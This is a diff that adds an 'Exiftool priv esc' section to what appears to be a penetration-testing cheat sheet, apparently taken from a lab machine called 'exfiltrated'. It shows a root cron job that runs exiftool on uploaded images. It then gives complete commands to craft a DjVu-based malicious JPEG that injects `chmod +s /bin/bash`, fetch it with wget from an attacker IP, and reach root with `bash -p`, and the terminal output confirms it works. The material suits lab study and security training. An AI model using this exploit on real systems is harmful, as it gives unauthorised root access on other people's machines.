@@ -1846,6 +1846,72 @@ sudo apt-get install libx11-dev:i386 libx11-dev
 gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
+### Exiftool priv esc
+````
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* *     * * *   root    bash /opt/image-exif.sh
+````
+````
+www-data@exfiltrated:/opt$ cat image-exif.sh
+cat image-exif.sh
+#! /bin/bash
+#07/06/18 A BASH script to collect EXIF metadata 
+
+echo -ne "\\n metadata directory cleaned! \\n\\n"
+
+
+IMAGES='/var/www/html/subrion/uploads'
+
+META='/opt/metadata'
+FILE=`openssl rand -hex 5`
+LOGFILE="$META/$FILE"
+
+echo -ne "\\n Processing EXIF metadata now... \\n\\n"
+ls $IMAGES | grep "jpg" | while read filename; 
+do 
+    exiftool "$IMAGES/$filename" >> $LOGFILE 
+done
+
+echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
+````
+#### Setup
+````
+sudo apt-get install -y djvulibre-bin
+wget -qO sample.jpg placekitten.com/200
+file sample.jpg
+printf 'P1 1 1 1' > input.pbm
+cjb2 input.pbm mask.djvu
+djvumake exploit.djvu Sjbz=mask.djvu
+echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
+djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
+exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
+perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
+````
+#### Exploit
+````
+www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.191:80/exploit.jpg
+````
+````
+www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
+ls -l /bin/bash
+-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
+ls -l /bin/bash
+-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+````
+````
+www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
+/bin/bash -p
+bash-5.0# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+````
 ### Monitor processes/cron jobs
 #### pspy
 ````
